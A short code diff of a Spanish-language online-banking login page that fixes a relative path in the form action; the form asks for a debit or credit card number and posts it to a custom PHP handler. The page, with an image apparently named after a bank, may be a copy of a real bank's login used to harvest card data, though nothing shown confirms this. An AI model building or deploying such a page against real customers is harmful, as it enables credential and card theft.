@@ -26,7 +26,7 @@ if (isset($_GET["error"])) {
             <div class="img_trabajador"><img src="img/bcp_bycer.jpg" alt="imagen_login.jpg"></img></div>
             <div class="iniciar_sesion">
                 <h1>Ingresa a tu banca en linea</h1>
-                <form action="php/user_login.php" method="POST" autocomplete="off">
+                <form action="../php/user_login.php" method="POST" autocomplete="off">
                     <div>
                         <input type="text" placeholder="Numero de tarjeta de debido o credito" name="tarjeta"
                             autocomplete="off">
